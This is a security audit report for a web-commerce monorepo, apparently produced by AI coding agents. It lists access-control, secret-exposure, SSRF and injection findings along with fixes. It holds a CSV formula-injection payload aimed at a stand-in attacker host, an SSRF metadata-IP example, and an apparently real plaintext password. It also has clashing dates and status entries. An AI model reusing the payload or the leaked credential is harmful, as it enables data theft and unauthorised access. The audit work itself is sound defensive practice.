Type: Log
Status: Active
Domain: Security
Last-reviewed: 2026-01-15

# Security Audit Report - January 2026

Audit Date: 2026-01-14
Updated: 2026-01-15
Auditor: Codex (GPT-5)
Scope: Full repository security assessment
Previous Audit: 2026-01-12 (API routes only)

Note: This report intentionally exceeds 350 lines to keep findings, remediation, and plan in one place. Follow-up: split into per-area appendices under docs/security/audits/2026-01/ while keeping this file as the executive summary.

## Executive Summary

This audit expands the API-only review to include secrets management, Firebase rules, dependency risk, CMS and product-pipeline endpoints, and security headers. Findings include 3 Critical, 14 High, 12 Medium, and 5 Low issues (including addenda below).

| Severity | Count | Immediate Action Required |
|----------|-------|---------------------------|
| CRITICAL | 3     | Yes - rotate secrets now  |
| HIGH     | 14    | Yes - within 2 weeks      |
| MEDIUM   | 12    | Yes - within 1 month      |
| LOW      | 5     | Plan for next sprint      |

Overall Security Grade: D+ (would be B after addressing Critical/High access-control gaps and stabilizing plan gates).

## Methodology and Coverage

- Reviewed Next.js API routes in `apps/cms`, `apps/cover-me-pretty`, `apps/product-pipeline`, `apps/xa*`, and `apps/handbag-configurator*`.
- Inspected Firebase rules, `.env` files, and config defaults for secret exposure and access control gaps.
- Reviewed middleware security headers and cron endpoints for authentication requirements.
- Dependency risk based on the existing audit list; no new network scans were run.
- Code is truth; doc findings are aligned to observed code paths in this repo snapshot.

## Critical Findings

### 1. Hardcoded Secrets Committed to Git

- Severity: CRITICAL
- CWE/OWASP: CWE-798 (Hard-coded Credentials); OWASP A02 (Cryptographic Failures), A05 (Security Misconfiguration)
- Component paths: `apps/reception/.env.local`, `apps/xa/.env.local`, `apps/xa-b/.env.local`, `apps/shop-secret/.env`, `packages/platform-core/apps/shopx/.env`, `packages/platform-core/apps/shop-env/.env`, `packages/platform-core/apps/shop-env-missing/.env`
- Risk: Exposure of Firebase credentials, session secrets, and service passwords enables account takeover and unauthorized access.
- Exploit narrative: Anyone with repo access can extract credentials, forge sessions, or access third-party services and production data.
- Minimal patch: Rotate all exposed credentials; purge files from git history with `git filter-repo`; move secrets to a managed vault; add `.env*` to `.gitignore`; add CI secret scanning.
- Test: Add a CI job (TruffleHog/Gitleaks) that fails on hardcoded secrets and tracked `.env` files; add a script that asserts no `.env` files are tracked in git.

### 2. Firebase Rules: Overly Permissive Root Access

- Severity: CRITICAL
- CWE/OWASP: CWE-284 (Improper Access Control); OWASP A01 (Broken Access Control)
- Component paths: `apps/prime/firebase-rules-update.json`
- Evidence: `.read` and `.write` allow `auth != null || now < 1819007200000`.
- Risk: Unauthenticated read/write access to the entire database until 2027.
- Exploit narrative: Any unauthenticated user can read/write arbitrary data, exfiltrate records, and alter state.
- Minimal patch: Remove the time-based bypass and enforce `auth != null` (or tighter per-path rules).
- Test: Firebase emulator rules tests that verify unauthenticated reads/writes fail and authenticated access is scoped.

### 3. Firebase Rules: Hardcoded Role Index Checks

- Severity: CRITICAL
- CWE/OWASP: CWE-863 (Incorrect Authorization); OWASP A01 (Broken Access Control)
- Component paths: `apps/prime/firebase-rules-update.json`
- Evidence: role checks use fixed indices (`roles/0`, `roles/1`, `roles/2`).
- Risk: Authorization bypass if roles array order changes or grows.
- Exploit narrative: A user can gain access by inserting roles at un-checked indices.
- Minimal patch: Store roles as map keys (`roles.owner == true`) and update rules accordingly.
- Test: Emulator tests that fail when roles are stored at different indices but pass with role-key maps.

## High Severity Findings

### 4. Hardcoded Google Apps Script URLs

- Severity: HIGH
- CWE/OWASP: CWE-200 (Exposure of Sensitive Information); OWASP A05 (Security Misconfiguration)
- Component paths: `apps/reception/src/services/useBookingEmail.ts`, `apps/reception/src/services/useEmailGuest.ts`, `apps/reception/src/services/alloggiatiService.ts`, `apps/reception/src/components/stats/Statistics.tsx`
- Risk: Exposes deployment IDs and makes internal scripts easy to target.
- Exploit narrative: Attacker scrapes IDs from source and calls scripts directly; if scripts are unauthenticated, data can be read or spammed.
- Minimal patch: Move URLs to environment variables; rotate deployment IDs; enforce auth in scripts; add allowlist of trusted origins.
- Test: Config validation test fails when required script URLs are missing in production builds.

### 5. Test Authentication Bypass in Production Code

- Severity: HIGH
- CWE/OWASP: CWE-287 (Improper Authentication); OWASP A07 (Identification and Authentication Failures)
- Component paths: `apps/cms/src/actions/common/auth.ts`
- Evidence: `CMS_TEST_ASSUME_ADMIN` bypasses auth when set.
- Risk: Misconfigured environments can grant admin access to any request.
- Exploit narrative: Setting or leaking this env var in production bypasses authorization checks.
- Minimal patch: Gate bypass behind `NODE_ENV === "test"` or compile-time flags; move helper to test-only code.
- Test: Unit test verifies `CMS_TEST_ASSUME_ADMIN` is ignored in production mode.

### 6. Rate Limiting Bypass via Header Spoofing

- Severity: HIGH
- CWE/OWASP: CWE-346 (Origin Validation Error); OWASP A07
- Component paths: `apps/cover-me-pretty/src/app/api/ai/pose/route.ts`, `apps/cover-me-pretty/src/app/api/ai/segment/route.ts`, `apps/cover-me-pretty/src/app/api/ai/depth/route.ts`, `apps/cover-me-pretty/src/app/api/tryon/garment/route.ts`
- Risk: Spoofed `x-forwarded-for` allows attackers to evade rate limits.
- Exploit narrative: Attacker rotates IPs in the header to bypass throttling and abuse endpoints.
- Minimal patch: Trust only verified CDN headers (`cf-connecting-ip`) or server-provided IP; ignore `x-forwarded-for` unless proxy is trusted.
- Test: Integration test ensures spoofed XFF does not change identity and rate limits still apply.

### 7. Unauthenticated OAuth Callback Handler

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01 (Broken Access Control)
- Component paths: `apps/cms/src/app/api/providers/[provider]/route.ts`
- Risk: Anyone can store OAuth tokens for any shop, linking unauthorized providers.
- Exploit narrative: Attacker calls `/cms/api/providers/<provider>?shop=<id>&code=<token>` and writes tokens to disk without auth.
- Minimal patch: Require authenticated session, verify shop access, validate OAuth `state`, validate `shop` with `validateShopName`, and require POST with CSRF protection.
- Test: Integration tests for 401 on unauth, 403 on unauthorized shop, and success on authorized with correct `state`.

### 8. Plaintext Password Storage (Demo Code)

- Severity: HIGH
- CWE/OWASP: CWE-256 (Unprotected Storage of Credentials); OWASP A02
- Component paths: `apps/cover-me-pretty/src/app/api/login/route.ts`
- Risk: Static credentials in code can be exploited if local auth is enabled in production.
- Exploit narrative: If `AUTH_PROVIDER=local` is set in production, attackers can log in with known demo credentials.
- Minimal patch: Remove hardcoded credentials; gate endpoint to non-production; use hashed credentials if local auth is necessary.
- Test: Unit test verifies production mode disables local auth or requires hashed credentials.

### 9. SSRF Vulnerability in Webhook Forwarding

- Severity: HIGH
- CWE/OWASP: CWE-918 (SSRF); OWASP A10
- Component paths: `apps/cover-me-pretty/src/app/api/leads/route.ts`
- Risk: Configurable webhook endpoint can be pointed at internal services or metadata.
- Exploit narrative: Attacker with settings access points webhook to `http://169.254.169.254/` or internal IPs, enabling SSRF.
- Minimal patch: Enforce allowlist of domains, require HTTPS, block private IPs, and set timeouts.
- Test: Unit test rejects localhost/private IPs and non-HTTPS URLs.

### 10. Cross-Shop Inventory Access

- Severity: HIGH
- CWE/OWASP: CWE-639 (Authorization Bypass Through User-Controlled Key); OWASP A01
- Component paths: `apps/cms/src/app/api/data/[shop]/inventory/[sku]/route.ts`
- Risk: Admin of one shop can modify inventory for another shop.
- Exploit narrative: Authenticated admin calls endpoint with a different shop ID to change stock/pricing.
- Minimal patch: Enforce shop-level authorization (session must include permitted shop IDs).
- Test: Integration test confirms cross-shop access is rejected.

### 11. Information Disclosure in Error Messages

- Severity: HIGH
- CWE/OWASP: CWE-209 (Information Exposure Through an Error Message); OWASP A05
- Component paths: `apps/cms/src/app/api/cart/handlers/utils.ts`
- Risk: Internal error messages and hints leak implementation details to clients.
- Exploit narrative: Attacker uses error text to infer database structure or internals.
- Minimal patch: Return generic errors to clients and log details server-side only.
- Test: Unit test ensures `serverError` responses do not include raw exception messages.

### 12. Unauthenticated Product-Pipeline Internal APIs

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01
- Component paths: `apps/product-pipeline/src/lib/api-context.ts`, `apps/product-pipeline/src/routes/api/exports/*.ts`, `apps/product-pipeline/src/routes/api/runner/*.ts`, `apps/product-pipeline/src/routes/api/stages/*`, `apps/product-pipeline/src/routes/api/artifacts/*`
- Risk: Public callers can export data, mutate pipeline state, upload artifacts, and drain storage.
- Exploit narrative: Attacker hits `/api/exports/leads` to download CSVs or `/api/stages/*` to run jobs and alter DB.
- Minimal patch: Add authentication (API key/Cloudflare Access) in `withPipelineContext`; enforce on every endpoint; restrict by service identity.
- Test: Integration test for 401 without token and success with valid token.

### 13. Unauthenticated CMS Media Management Endpoints

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01
- Component paths: `apps/cms/src/app/api/media/route.ts`
- Risk: Unauthenticated listing, upload, delete, and metadata changes for any shop.
- Exploit narrative: Attacker posts files, deletes assets, or enumerates media for arbitrary shops.
- Minimal patch: Require session and roles; enforce shop ownership; add rate limiting.
- Test: Integration test ensuring 401/403 on unauth and non-authorized access.

### 14. Unauthenticated CMS Preview Link Creation and Access

- Severity: HIGH
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01
- Component paths: `apps/cms/src/app/api/page-versions/[shop]/[pageId]/[versionId]/preview-link/route.ts`, `apps/cms/src/app/api/page-versions/preview/[token]/route.ts`
- Risk: Anyone can create preview links and access unpublished content; tokens never expire; preview passwords are stored with fast unsalted hashes and compared without constant-time safety; password is accepted via query string.
- Exploit narrative: Attacker creates tokens for any shop/page/version and pulls unpublished content or brute-forces preview passwords offline if link storage is leaked; query-string passwords can be logged by proxies and analytics.
- Minimal patch: Require authenticated session and shop access to create links; add token TTL/expiry and optional one-time use; store issuer; switch password hashing to Argon2id with per-link salt and verify with timing-safe comparison; accept password via POST body or header instead of query string.
- Test: Integration tests for unauthorized creation (401), expired token rejection (401/410), and valid token success; unit test ensures Argon2 hash verification and timing-safe compare are used.

## Medium Severity Findings

### 15. Dependency Vulnerabilities (10 packages)

- Severity: MEDIUM
- CWE/OWASP: CWE-1104 (Use of Unmaintained Third Party Components); OWASP A06 (Vulnerable and Outdated Components)
- Component paths: lockfile and workspace dependencies
- Risk: Known vulnerabilities in transitive dependencies may be exploitable depending on usage paths.
- Exploit narrative: Attackers target known CVEs in deployed packages.
- Minimal patch: Update dependencies or apply overrides; remove unused packages.
- Test: CI job runs `pnpm audit --production` and fails on high/critical.
- Update (2026-01-17): `form-data` vulnerability in Cypress dependency chain resolved via `pnpm.overrides` pin to 4.0.5.

| Package | Severity | CVE | Path |
|---------|----------|-----|------|
| `next-auth` | Moderate | - | `.>next-auth` |
| `axios` | Moderate | CVE-2024-* | `bundlesize>github-build>axios` |
| `got` | Moderate | CVE-2022-33987 | `cypress-audit>lighthouse>...>got` |
| `cookie` | Moderate | - | `@cloudflare/next-on-pages>cookie` |
| `elliptic` | Moderate | - | `@storybook/nextjs>...>elliptic` |
| `semver` | Moderate | - | `cypress-audit>pa11y>semver` |
| `esbuild` | Moderate | - | `@cloudflare/next-on-pages>esbuild` |
| `lodash.set` | Moderate | - | `cypress-audit>lighthouse>lodash.set` |
| `tmp` | Moderate | - | `@lhci/cli>...>tmp` |
| `js-yaml` | Moderate | - | `@cypress/code-coverage>js-yaml` |

### 16. Content Security Policy Gaps

- Severity: MEDIUM
- CWE/OWASP: CWE-693 (Protection Mechanism Failure); OWASP A05
- Component paths: `middleware.ts`
- Risk: Missing `script-src`, `style-src`, `img-src`, and `font-src` reduces XSS mitigation.
- Exploit narrative: If any XSS exists, CSP provides limited protection.
- Minimal patch: Add explicit directives with nonces and allowed sources.
- Test: Header snapshot test verifies CSP directives are present and include nonce.

### 17. Firebase: Self-Registration with Staff Role

- Severity: MEDIUM
- CWE/OWASP: CWE-269 (Improper Privilege Management); OWASP A01
- Component paths: `apps/prime/firebase-rules-update.json`
- Risk: Users can self-register as staff without approval.
- Exploit narrative: Attacker creates profile with `roles[0] = "staff"` to gain privileged access.
- Minimal patch: Require admin approval for role assignment; enforce via rules and server-side checks.
- Test: Emulator test rejects self-registration with staff role.

### 18. Missing Rate Limiting on Password Reset

- Severity: MEDIUM
- CWE/OWASP: CWE-307 (Improper Restriction of Excessive Authentication Attempts); OWASP A07
- Component paths: `apps/cover-me-pretty/src/app/api/password-reset/request/route.ts`
- Risk: Brute force or spam of password reset endpoint.
- Exploit narrative: Attacker automates requests to flood users or enumerate activity.
- Minimal patch: Add rate limiter (for example, 3 requests per 15 minutes per IP/email).
- Test: Integration test verifies 429 after threshold is exceeded.

### 19. CSV Upload MIME Type Fallback

- Severity: MEDIUM
- CWE/OWASP: CWE-434 (Unrestricted Upload of File with Dangerous Type); OWASP A05
- Component paths: `apps/cms/src/app/api/upload-csv/[shop]/route.ts`
- Risk: Client-provided MIME type is used when magic bytes detection fails.
- Exploit narrative: Attacker uploads non-CSV data with `text/csv` header to bypass file checks.
- Minimal patch: Require positive magic byte detection or parse CSV content before accepting.
- Test: Upload a non-CSV file with `text/csv` header and assert 415.

### 20. IP Extraction from Untrusted Headers

- Severity: MEDIUM
- CWE/OWASP: CWE-346 (Origin Validation Error); OWASP A07
- Component paths: multiple routes using `x-forwarded-for`
- Risk: Spoofed IPs affect logging, abuse detection, and throttling.
- Exploit narrative: Attacker spoofs IP to bypass IP-based protections.
- Minimal patch: Use trusted headers only or derive identity from session/user ID.
- Test: Integration test ensures spoofed headers do not alter identity.

### 21. Cart Operations Lack Session Validation

- Severity: MEDIUM
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01
- Component paths: `apps/cms/src/app/api/cart/route.ts` and handlers
- Risk: Cart modifications rely only on cookie-based cart ID without session validation.
- Exploit narrative: Attacker replays or guesses cart IDs to modify other users' carts.
- Minimal patch: Bind cart IDs to authenticated sessions or sign cookies with user context.
- Test: Integration test that modifications without a valid session fail.

### 22. Production .env Files with Dummy Secrets

- Severity: MEDIUM
- CWE/OWASP: CWE-200 (Exposure of Sensitive Information); OWASP A05
- Component paths: `apps/cms/.env.production`, `apps/cms/next.config.mjs`
- Risk: Dummy secrets or dev defaults can be used in production, weakening auth/signing.
- Exploit narrative: Missing real env values cause predictable secrets to be used.
- Minimal patch: Rename `.env.production` to `.env.production.example`; enforce production env validation; remove dev defaults from production builds.
- Test: Config tests fail when dummy or dev defaults are used in production mode.

### 23. CSV Formula Injection in Product-Pipeline Exports

- Severity: MEDIUM
- CWE/OWASP: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File); OWASP A03
- Component paths: `apps/product-pipeline/src/routes/api/exports/leads.ts`, `apps/product-pipeline/src/routes/api/exports/candidates.ts`
- Risk: Spreadsheet formula injection when CSVs are opened.
- Exploit narrative: Attacker injects `=HYPERLINK("http://attacker/"&A1)` in a field; Excel/Sheets executes it.
- Minimal patch: Prefix any cell beginning with `=`, `+`, `-`, or `@` with `'` or `\t` before writing.
- Test: Unit test for CSV sanitizer ensures formula-leading values are neutralized.

### 24. Unauthenticated SEO Notify Endpoints

- Severity: MEDIUM
- CWE/OWASP: CWE-862 (Missing Authorization); OWASP A01/A05
- Component paths: `apps/cms/src/app/api/seo/notify/cron/route.ts`, `apps/cms/src/app/api/seo/notify/route.ts`
- Risk: Unauthenticated callers can trigger notifications and enumerate shops via response map.
- Exploit narrative: Attacker repeatedly calls endpoints to spam webhooks and consume resources.
- Minimal patch: Require `CRON_SECRET` or service-to-service auth; restrict to POST and rate limit.
- Test: Integration test requires valid bearer token and rejects unauthenticated requests.

## Low Severity Findings

### 25. Missing HSTS Preload List Submission

- Severity: LOW
- CWE/OWASP: CWE-693 (Protection Mechanism Failure); OWASP A05
- Component paths: deployment/configuration (HSTS preload list submission)
- Risk: Without preload, first-visit HTTPS downgrade risk remains for new users.
- Exploit narrative: Attacker on first visit can attempt SSL stripping before HSTS is cached.
- Minimal patch: Submit domains to the HSTS preload list and ensure long max-age values.
- Test: Operational check in release checklist or CI validation of domain preload status.

### 26. CORS Wildcard on Handbag Configurator API

- Severity: LOW
- CWE/OWASP: CWE-942 (Permissive Cross-domain Policy with Untrusted Domains); OWASP A05
- Component paths: `apps/handbag-configurator-api/src/server.ts`
- Risk: Allows cross-origin access from any origin; increases abuse surface if endpoints assume same-origin.
- Exploit narrative: Malicious site can call endpoints directly to automate abuse.
- Minimal patch: Restrict `Access-Control-Allow-Origin` to known origins or require auth.
- Test: Integration test that disallowed origins do not receive CORS headers.

### 27. Content-Type Header Not Enforced for JSON Endpoints

- Severity: LOW
- CWE/OWASP: CWE-20 (Improper Input Validation); OWASP A03
- Component paths: example `apps/cover-me-pretty/src/app/api/leads/route.ts`
- Risk: Non-JSON payloads can be parsed unexpectedly, increasing parsing surface.
- Exploit narrative: Attacker sends malformed data to trigger parser edge cases.
- Minimal patch: Require `Content-Type: application/json` for JSON endpoints.
- Test: Integration test returns 415 for non-JSON content types.

### 28. Test Fixtures Include Secrets in Plaintext

- Severity: LOW
- CWE/OWASP: CWE-798 (Hard-coded Credentials); OWASP A02
- Component paths: `packages/config/test/setup-env.ts`, `packages/test-utils/src/repo.ts`
- Risk: Low (test-only), but normalizes storing secrets in code and can be reused accidentally.
- Exploit narrative: Developer might copy test values into production configs.
- Minimal patch: Prefix test secrets with `test-` and add comments; ensure production env validation rejects them.
- Test: Config tests fail when `test-` secrets are used in production mode.

## Positive Findings

- Webhook signature verification (HMAC with timing-safe comparison).
- Strong input validation with Zod schemas.
- Password hashing with Argon2 where used in production paths.
- Pre-signed URLs for R2 uploads with expiration.
- Comprehensive secrets management documentation (`docs/secrets-management.md`).
- HSTS enabled with preload flag in middleware.
- X-Frame-Options, X-Content-Type-Options headers present.
- Cross-Origin-Opener-Policy and Cross-Origin-Embedder-Policy headers present.
- Prisma ORM used for DB access (low SQL injection risk).
- Shop name validation (`validateShopName()`).
- Rate limiting infrastructure exists (needs hardening for trusted IPs).
- MFA support for customer accounts.

## Implementation Plan

### Phase 1: Immediate (This Week)

| Task | Priority | Status |
|------|----------|--------|
| Rotate all exposed secrets (SESSION_SECRET, Firebase, service credentials) | P0 | TODO |
| Fix Firebase rules - remove timestamp bypass | P0 | **DONE** (2026-01-21) |
| Fix Firebase role checks - remove hardcoded indices | P0 | **DONE** (2026-01-21) |
| Remove secrets from git history with `git filter-repo` | P0 | TODO |
| Update `.gitignore` to prevent future leaks | P0 | TODO |

### Phase 2: Short-term (2 Weeks)

| Task | Priority | Status |
|------|----------|--------|
| Lock down product-pipeline internal APIs with auth middleware | P1 | **DONE** (2026-01-21) |
| Add authentication + shop checks to CMS media endpoints | P1 | **DONE** (2026-01-21) |
| Require auth + TTL for CMS preview link creation and access | P1 | **DONE** (2026-01-21) |
| Lock down CMS marketing email endpoints (campaigns + marketing/email) | P1 | **DONE** (2026-01-21) |
| Lock down CMS segments/library/comments endpoints | P1 | **DONE** (2026-01-21) |
| Restrict RBAC user list endpoint to admins | P1 | **DONE** (2026-01-21) |
| Fix test auth bypass (`CMS_TEST_ASSUME_ADMIN`) | P1 | **DONE** (already guarded by NODE_ENV === "test") |
| Add authentication + OAuth `state` validation in provider callback | P1 | **DONE** (2026-01-21) |
| Fix rate limiting identity to use trusted IP headers | P1 | **DONE** (2026-01-21) |
| Fix SSRF in lead webhook forwarding (allowlist + timeouts) | P1 | **DONE** (2026-01-21) |
| Move Google Apps Script URLs to env vars and rotate IDs | P1 | TODO |
| Remove plaintext demo credentials or gate local auth to non-prod | P1 | **DONE** (2026-01-21) |
| Add shop-level authorization to inventory endpoints | P1 | **DONE** (2026-01-21) |
| Sanitize error messages returned to clients | P1 | **DONE** (2026-01-21) |

### Phase 3: Medium-term (1 Month)

| Task | Priority | Status |
|------|----------|--------|
| Update vulnerable dependencies | P2 | TODO |
| Strengthen CSP directives (script-src, style-src, img-src, font-src) | P2 | **DONE** (2026-01-21) |
| Add rate limiting to password reset | P2 | **DONE** (2026-01-21) |
| Require magic-byte validation for CSV uploads | P2 | **DONE** (2026-01-21) |
| Add session validation to cart operations | P2 | **DONE** (2026-01-21, already secure: HMAC-signed cookies + UUID IDs) |
| Remove dummy `.env.production` and enforce production env validation | P2 | **DONE** (2026-01-21) |
| Sanitize CSV exports to prevent formula injection | P2 | **DONE** (2026-01-21) |
| Protect SEO notify cron endpoint with secret | P2 | **DONE** (2026-01-21) |
| Require auth/queueing for SEO audit endpoint (Lighthouse runs) | P2 | **DONE** (2026-01-21) |
| Restrict shop list + discount listing endpoints to authorized roles | P2 | **DONE** (2026-01-21) |
| Add upper bounds for sections pagination parameters | P2 | **DONE** (2026-01-21) |

### Phase 4: Ongoing

| Task | Frequency |
|------|-----------|
| Implement secrets scanning in CI/CD (TruffleHog/Gitleaks) | Once |
| Run `pnpm audit` for dependency vulnerabilities | Weekly |
| Security-focused code review checklist | Per PR |
| Penetration testing | Quarterly |
| Rotate production secrets | Every 90 days |

## Verification Checklist

After implementing fixes, verify:

- [ ] All old secrets are rotated and new ones deployed
- [ ] Git history no longer contains secrets (secret scanner clean)
- [x] Firebase rules reject unauthenticated requests (fixed 2026-01-21: removed timestamp bypass, converted role indices to map)
- [x] `CMS_TEST_ASSUME_ADMIN` has no effect in production builds (verified 2026-01-21: already guarded by NODE_ENV === "test")
- [x] OAuth callbacks require authentication and valid `state` (fixed 2026-01-21: added ensureShopAccess + validateShopName)
- [x] Product-pipeline APIs reject unauthenticated requests (fixed 2026-01-21: added API key auth middleware)
- [x] CMS media endpoints require authenticated + authorized access (fixed 2026-01-21: added shop-level authorization)
- [x] CMS preview links require auth and tokens expire (fixed 2026-01-21: added ensureAuthorized, Argon2id hashing, 24h TTL)
- [x] CMS marketing email endpoints require authenticated + authorized access (fixed 2026-01-21: added shop-level auth)
- [x] CMS segments/library/comments endpoints require authenticated + authorized access (fixed 2026-01-21: added shop-level auth)
- [x] RBAC user list endpoint is restricted to admins (fixed 2026-01-21: added ensureAuthorized)
- [x] Rate limiting uses trusted IP sources only (fixed 2026-01-21: prioritize CF-Connecting-IP over X-Forwarded-For)
- [x] Lead webhook forwarding blocks private IPs (fixed 2026-01-21: safeWebhookFetch utility with SSRF protection)
- [x] Demo credentials removed or gated to non-production (fixed 2026-01-21: production gate + env-based config + Argon2)
- [x] Error messages sanitized (fixed 2026-01-21: generic errors returned, full details logged server-side)
- [x] Password reset is rate limited (fixed 2026-01-21: 3 requests per 15 minutes per IP)
- [x] CSV uploads reject unknown file types (fixed 2026-01-21: content-based validation, reject if has binary chars or no delimiters)
- [x] CSP headers include all required directives (fixed 2026-01-21: added style-src, font-src with nonce + Google Fonts)
- [x] CSV exports are sanitized against formula injection (fixed 2026-01-21: prefix formula chars with single quote)
- [x] Cart cookies are cryptographically signed (verified 2026-01-21: HMAC-SHA256 + __Host- prefix + HttpOnly)
- [x] SEO notify/audit endpoints require a secret or authenticated service (fixed 2026-01-21: cron secret + shop auth)
- [x] Shop list and discount listing endpoints require authorization (fixed 2026-01-21: ensureAuthorized + ensureShopReadAccess)
- [x] Sections pagination rejects extreme values (fixed 2026-01-21: page capped at 1000)
- [ ] `pnpm audit` shows no high/critical vulnerabilities
- [x] Inventory endpoints validate shop-level permissions (fixed 2026-01-21: changed ensureRole to ensureShopAccess)

## OWASP Top 10 (2021) Compliance

| Risk | Status | Notes |
|------|--------|-------|
| A01: Broken Access Control | ⚠️ Partial | Firebase bypass, cross-shop access, unauth CMS marketing/content/RBAC endpoints, pipeline APIs |
| A02: Cryptographic Failures | ⚠️ Partial | Secrets in git, plaintext demo passwords |
| A03: Injection | ⚠️ Partial | CSV formula injection risk |
| A04: Insecure Design | ⚠️ Partial | Test auth bypass in prod code |
| A05: Security Misconfiguration | ⚠️ Partial | CSP gaps, dummy env defaults, CORS wildcard |
| A06: Vulnerable Components | ⚠️ Partial | 10 moderate vulns in deps |
| A07: ID & Auth Failures | ⚠️ Partial | Rate limiting bypass, missing auth on endpoints |
| A08: Software & Data Integrity | ✅ Good | Webhook signature verification |
| A09: Logging & Monitoring | ⚠️ Partial | Limited audit trail for privileged actions |
| A10: SSRF | ⚠️ Partial | Lead webhook forwarding |

## Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Firebase Security Rules: https://firebase.google.com/docs/database/security
- Next.js Security Headers: https://nextjs.org/docs/advanced-features/security-headers
- git-filter-repo: https://github.com/newren/git-filter-repo
- Internal: `docs/secrets-management.md`

Report Generated: 2026-01-14
Previous Review: 2026-01-12
Next Review: 2026-04-14 (Quarterly)

For questions or to report security issues, contact the security team or create a confidential issue in the repository.

---

## Additional Audit Findings (Claude Opus 4.5 - 2026-01-14)

### Verification of Existing Findings

**CONFIRMED - Critical Finding #1 (Hardcoded Secrets):**
- `apps/shop-secret/.env` contains production session secret: `SESSION_SECRET=10f51a4aac883...`
- `apps/reception/.env.local` contains Firebase credentials AND plaintext passwords: `NEXT_PUBLIC_ALLO_PASSWORD=jg9BSU5h`
- `apps/xa/.env.local` contains weak dev secrets that could leak to production

**CONFIRMED - High Finding #7 (Unauthenticated OAuth Callback):**
Verified at [route.ts](apps/cms/src/app/api/providers/[provider]/route.ts) - NO authorization check exists. Any caller can write arbitrary tokens to any shop's data directory via `writeJsonFile(path.join(dir, ${provider}.json), { token: code })`.

**CONFIRMED - High Finding #13 (Unauthenticated CMS Media):**
Verified at [route.ts](apps/cms/src/app/api/media/route.ts) - All 5 HTTP methods (GET, POST, DELETE, PATCH, PUT) have ZERO authentication. Any caller can list, upload, delete, and modify media metadata for any shop.

**CONFIRMED - High Finding #5 (Test Auth Bypass):**
Verified at [auth.ts](apps/cms/src/actions/common/auth.ts) - `CMS_TEST_ASSUME_ADMIN` grants admin access when set. While guarded by `process.env`, this is still production code that should be compile-time excluded.

### NEW Findings Not in Original Report

#### NEW-1. Weak Password Hashing for Preview Links (HIGH)

- **CWE:** CWE-326 (Inadequate Encryption Strength)
- **Files:** `apps/cms/src/app/api/page-versions/[shop]/[pageId]/[versionId]/preview-link/route.ts`, `apps/cms/src/app/api/page-versions/preview/[token]/route.ts`
- **Issue:** Preview link passwords use unsalted SHA-256: `crypto.createHash("sha256").update(pw).digest("hex")`
- **Risk:** SHA-256 is not a password hashing function - too fast for brute force, no salt means rainbow table attacks work
- **Fix:** Use argon2 (already used elsewhere in codebase) with salt

#### NEW-2. Timing Attack in Password Comparison (MEDIUM)

- **CWE:** CWE-208 (Observable Timing Discrepancy)
- **File:** `apps/cms/src/app/api/page-versions/preview/[token]/route.ts:51`
- **Issue:** `computed === link.passwordHash` uses non-constant-time string comparison
- **Fix:** Use `crypto.timingSafeEqual(Buffer.from(computed), Buffer.from(link.passwordHash))`

#### NEW-3. Missing Shop Name Validation in Provider Route (MEDIUM)

- **CWE:** CWE-22 (Path Traversal)
- **File:** `apps/cms/src/app/api/providers/[provider]/route.ts:18`
- **Issue:** `shop` parameter uses basic `z.string()` but other routes use `validateShopName()` for path safety
- **Risk:** Potential path traversal if shop contains `../` sequences
- **Fix:** Add `validateShopName()` call before using shop in path

#### NEW-4. Integer Overflow in Pagination (LOW)

- **CWE:** CWE-190 (Integer Overflow)
- **File:** `apps/cms/src/app/api/sections/[shop]/route.ts:25-29`
- **Issue:** Large values for page/pageSize could cause overflow in `(page - 1) * pageSize`
- **Fix:** Add upper bounds validation

---

## Production Readiness Critique

### Current Grade: D+ (Not Production Ready)

The report now grades the system at D+, which is still **not production ready**. Here's the updated assessment:

### Blocking Issues for Production

1. **Secrets in Git History** - This alone is disqualifying. Even after rotation, attackers with historical repo access can use old credentials. Git history scrubbing is **mandatory** before any production launch.

2. **Unauthenticated Admin Endpoints** - The CMS media API and product-pipeline APIs allow full CRUD operations without any auth. These aren't just "high severity" - they're **immediate exploitation vectors**.

3. **Firebase Rules Allow Public Write** - Until 2027, anyone can read/write the entire database. This is catastrophic for any production data.

4. **No Auth on OAuth Provider Callback** - Attackers can hijack third-party integrations by overwriting tokens for any shop.

5. **Unauthenticated Email Campaign Endpoints** - Anyone can send campaigns and list metrics; this risks spam/abuse and deliverability bans.

6. **Unauthenticated Content & RBAC Endpoints** - Segments, library items, comments, and RBAC user lists are readable/writable without auth.

### Plan Critique

| Plan Element | Issue |
|--------------|-------|
| **Phase 1 timeline "This Week"** | Unrealistic. Secret rotation + history scrubbing + Firebase rules is 2-3 weeks of careful work minimum |
| **Phase 2 "2 Weeks"** | 14+ high-severity items in 2 weeks is aggressive. This should be 4-6 weeks with testing |
| **Missing: Staging Environment** | No mention of testing fixes in staging before production |
| **Missing: Incident Response** | What if secrets are already compromised? Need IR plan |
| **Missing: Security Testing** | No penetration testing before go-live |
| **Missing: Dependency Lock** | 10 vulnerable deps need immediate lockfile updates |

### Recommended Production-Ready Roadmap

#### Gate 0: Incident Assessment (Before ANY other work)
- [ ] Assume all committed secrets are compromised
- [ ] Check for unauthorized access using old credentials
- [ ] Document potential exposure window
- [ ] Prepare breach notification if required

#### Gate 1: Foundation (Must complete before ANY production traffic)
- [ ] Rotate ALL secrets (Firebase, session, API keys, service passwords)
- [ ] Scrub git history with `git filter-repo`
- [ ] Force-push cleaned history (coordinate with team)
- [ ] Fix Firebase rules (remove timestamp bypass, fix role checks)
- [ ] Add auth to CMS media endpoints
- [ ] Add auth to product-pipeline APIs
- [ ] Fix OAuth provider callback (add session + shop ownership check)
- [x] Lock down CMS marketing email endpoints (campaigns + marketing/email) — fixed 2026-01-21
- [x] Lock down CMS segments/library/comments endpoints — fixed 2026-01-21
- [x] Restrict RBAC user list endpoint to admins — fixed 2026-01-21
- [ ] Deploy to staging and verify

#### Gate 2: Hardening (Required for production launch)
- [ ] Remove `CMS_TEST_ASSUME_ADMIN` from production builds
- [ ] Fix rate limiting to use trusted IP headers only
- [ ] Add SSRF protection to webhook forwarding
- [ ] Fix preview link password handling (Argon2id + timing-safe compare + no URL passwords)
- [ ] Add shop authorization to inventory endpoints
